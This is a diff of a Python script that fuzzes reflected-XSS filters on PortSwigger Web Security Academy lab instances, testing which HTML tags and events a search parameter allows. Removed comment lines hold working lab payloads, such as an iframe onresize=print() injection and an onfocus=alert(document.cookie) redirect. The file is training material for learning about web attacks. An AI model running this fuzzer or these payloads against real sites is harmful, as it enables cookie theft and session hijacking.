@@ -17,7 +17,6 @@ def connect(url, injection):
         }
 
     for i in open("payload.txt", "r"):
-        i = i.rstrip('\n')
         encPayload = urllib.parse.quote(i)
         testUrl = target + encPayload
         r = requests.get(testUrl, proxies=proxies, headers=headers)
@@ -40,8 +39,7 @@ def allowedTag(url, injection):
         }
 
     for i in open("tag.txt", "r"):
-        i = i.rstrip('\n')
-        testUrl = target + "<" + i + ">"
+        testUrl = target + "<" + i.rstrip('\n') + ">"
         r = requests.get(testUrl, proxies=proxies, headers=headers)
         if "Tag is not allowed" in r.text:
             pass
@@ -63,27 +61,24 @@ def allowedEvent(url, injection, tag):
 
     #for i in open("event.txt", "r"):
     for i in open("tag.txt", "r"):
-        i = i.rstrip('\n')
         #testUrl = target + "<" + tag + "%20" + i + "=1>"
-        testUrl = target + "<" + tag + "><" + i + ">"
+        testUrl = target + "<" + tag + "><" + i.rstrip('\n') + ">"
         r = requests.get(testUrl, proxies=proxies, headers=headers)
-        #print(r.text)
+        
         if "Tag is not allowed" in r.text:
             pass
         elif "Event is not allowed" in r.text:
             pass
         else:
             print(f'[INFO] Allowed event: {i}', end="")
-            #break
     return i
 
 
 if __name__ == '__main__':
-    url = "https://ac9a1f241ec9b695c01d471000fb0085.web-security-academy.net/"
+    url = "https://ac031f331e691f60c0bf9ad700b40012.web-security-academy.net/"
     injection = "?search="
     
-    #tag = allowedTag(url, injection)
-    tag = "svg"
+    tag = allowedTag(url, injection)
     event = allowedEvent(url, injection, tag)
 
     #print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))
@@ -91,25 +86,5 @@ if __name__ == '__main__':
     #connect(url, injection)
 
 
-# XSS Labs
-# -------------------------------------------------------------------------------------------------------------------------------------------
-# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 
-#
-# -------------------------------------------------------------------------------------------------------------------------------------------
-# [3] Reflected XSS into HTML context with all tags blocked except custom ones
-# <script>location = 'https://ac081f4d1fda91bec1dd414e00810097.web-security-academy.net/?search=%3Cbigb0ss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script> 
-#
-# -------------------------------------------------------------------------------------------------------------------------------------------
-# [4] Reflected XSS with event handlers and href attributes blocked
-#
-# Allowed tags
-# -------------------------------
-# [INFO] Allowed tag: a
-# [INFO] Allowed tag: animate
-# [INFO] Allowed tag: image
-# [INFO] Allowed tag: svg
-# [INFO] Allowed tag: title
-#
-# Allowed "svg" tags
-# -------------------------------
+
 
